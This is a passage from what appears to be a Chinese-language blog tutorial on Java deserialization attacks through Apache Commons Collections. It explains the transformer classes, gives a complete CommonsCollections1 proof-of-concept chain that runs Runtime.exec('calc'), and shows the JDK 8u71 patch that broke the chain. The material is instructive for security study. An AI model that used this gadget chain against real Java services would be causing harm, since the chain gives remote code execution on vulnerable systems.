<code>transform</code> 方法将这个对象再返回： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 在
<code>Transformer</code> 构造的代码执行流中，我们可以把
<code>ConstantTransformer</code>
理解为一个常量，可以返回一个确定的对象。</p>
<p>这样我们就可以屏蔽前面定义的 <code>readObject</code> 方法触发
<code>transform</code> 方法调用时传入的 <code>input</code>
参数对我们构造的 <code>Transformer</code> 构造的代码执行流产生影响。
#### InvokerTransformer <code>InvokerTransformer</code> 可以对
<code>transform</code>
方法传入的对象参数用来执行任意方法，这也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个 <code>InvokerTransformer</code> 时，需要传入三个参数： -
<code>String methodName</code>：待执行的函数名 -
<code>Class[] paramTypes</code>：这个函数的参数类型列表 -
<code>Object[] args</code>：传给这个函数的参数列表 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
后面的回调 <code>transform</code> 方法，就是执行了 <code>input</code>
对象的 <code>iMethodName</code> 方法，并传入 <code>iArgs</code> 参数，即
<code>input.iMethod(iArgs)</code>。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ####
InstantiateTransformer <code>InstantiateTransformer</code> 会把传入的
<code>input</code> 看做是一个 <code>Class</code>
对象，然后调用其对应的构造函数并传入指定参数来实例化一个对象。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> #### ChainedTransformer <code>ChainedTransformer</code>
也是实现了 <code>Transformer</code> 接口的一个类，它的作用是将内部的多个
<code>Transformer</code>
串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### Transformer 构造代码执行流 #### 构造任意代码执行
根据前面对 <code>Transformer</code> 的介绍，我们可以将
<code>Runtime.getRuntime().exec("calc")</code> 拆解为
<code>runtime = Runtime.getRuntime()</code> 和
<code>runtime.exec("calc")</code> 两部分，因而有如下构造：
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div> 然而由于 <code>Runtime</code> 对象没有实现
<code>Serializable</code> 接口，因此 <code>transformerChain</code>
对象是无法序列化的，因此我们还要把 <code>Runtime.getRuntime()</code>
拆解为 <code>getRuntime = Runtime.class.getMethod("getRuntime")</code>
和 <code>getRuntime.invoke(null)</code>。</p>
<p>由于 <code>InvokerTransformer</code> 内部会对传入的方法调用
<code>getMethod</code> 查找，因此构造 <code>InvokerTransformer</code>
时传入的参数类型需要严格按照传入的方法名对应的方法的定义来，且参数要和参数类型数量严格对应，这就是为什么实际上我们构造的是
<code>Runtime.class.getMethod("getRuntime", null)</code> 和
<code>getRuntime.invoke(null, null)</code> 。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div> ####
构造任意字节码加载 <code>TemplatesImpl</code>
加载任意字节码有如下调用栈：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要想办法让程序执行流程能够到达这个调用栈中任意一个函数即可，例如
<code>newTransformer</code>。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div> ## 相关利用链 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5a4d01c1d0904b5c8444ceaa2cf42198.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3
id="commonscollections0annotationinvocationhandlertransformedmap">CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</h3>
<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的
<code>readObject</code> 中的 <code>memberValue.setValue</code> 会调用
<code>setValue</code> 方法，进而会调用到 <code>memberValues</code> 的
<code>transformer</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 不过这里需要绕过
<code>memberType != null</code> 判断，根据调试可知
<code>memberTypes</code> 中的 <code>key</code> 是构造时传入的
<code>type</code> 对应的类中的所有方法名字符串，而 <code>name</code>
是构造时传入的 <code>memberValues</code> 中的某个 <code>key</code>。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 又因为 <code>type</code> 还要继承自
<code>Annotation</code>，因此因此我构造的时候 <code>type</code> 选择
<code>Retention.class</code> ，这样 <code>memberTypes</code>
中的键就有一个 <code>value</code> 字符串，此时我们预先在
<code>memberValues</code> 中存一个 <code>value</code>
字符串的键就可以执行到 <code>setValue</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 完整
poc 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:204, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:356, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:36, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div> 在 8u71 以后大概是
2015 年 12 月的时候，Java 官方<a class="link" 
 href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >修改 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了
<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的
<code>readObject</code> 函数。新版的 <code>readObject</code> 不再操作
<code>memberValues</code> 而是操作
<code>Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get("memberValues", null)</code>
，因此 CC1 失效。</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span 